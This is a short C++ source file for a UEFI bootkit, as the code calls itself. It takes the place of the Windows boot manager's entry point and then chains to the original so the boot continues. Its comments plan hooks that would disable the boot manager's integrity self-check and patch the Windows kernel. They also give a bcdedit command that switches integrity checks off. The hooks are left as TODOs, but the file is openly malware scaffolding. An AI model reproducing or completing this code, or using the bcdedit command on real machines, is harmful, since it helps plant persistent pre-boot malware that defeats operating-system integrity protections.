#include "Efi.hpp"

extern "C" EFI_IMAGE_DOS_HEADER __ImageBase;

EFI_STATUS EFIAPI EfiEntry(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE* SystemTable)
{
	InitializeGlobals(ImageHandle, SystemTable);

	EFI_LOADED_IMAGE* bootmgfwImage = nullptr;
	EFI_STATUS status = gBS->HandleProtocol(ImageHandle, &gEfiLoadedImageProtocolGuid, (void**)&bootmgfwImage);
	if (EFI_ERROR(status))
	{
		return status;
	}

	if (bootmgfwImage->ImageBase == &__ImageBase)
	{
		// Running the bootkit directly is not supported
		return EFI_UNSUPPORTED;
	}

	// Install bootmgfw hooks

	// TODO: Hook BmFwVerifySelfIntegrity to return 0
	// Alternative: bcdedit /store BCD /set {bootmgr} nointegritychecks on

	// TODO: hook ImgArchStartBootApplication/BootServices to patch ntoskrnl

	// Call the original entry point (embedded in the bootkit PE)
	auto pnth = (EFI_IMAGE_NT_HEADERS64*)((UINT8*)&__ImageBase + __ImageBase.e_lfanew);
	auto originalEntryRva = pnth->OptionalHeader.AddressOfEntryPoint;
	auto originalEntry = (decltype(&EfiEntry))((UINT8*)bootmgfwImage->ImageBase + originalEntryRva);

	return originalEntry(ImageHandle, SystemTable);
}